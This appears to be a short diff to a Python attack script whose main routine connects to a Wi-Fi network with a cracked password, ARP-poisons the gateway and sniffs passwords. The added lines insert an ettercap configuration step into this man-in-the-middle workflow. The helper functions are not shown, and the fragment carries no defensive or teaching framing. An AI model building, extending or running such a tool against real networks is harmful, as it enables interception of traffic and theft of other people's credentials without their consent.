@@ -62,6 +62,12 @@ if __name__ == "__main__":
     connectToNetwork()
     input("Password found! Connect to '{}' with password '{}' and press enter when ready".format(essid, password))
     print("ARP Poisoning...")
+
+    # ettercap
+    ip = getMachineIPAddress()
+    ettercapConfiguration(ip)
+    # ettercap
+
     gatewayIP = getGatewayIP()
     arpSpoofProc = arpPoison(INTERFACE_NAME, gatewayIP)
     print("Sniffing passwords...")
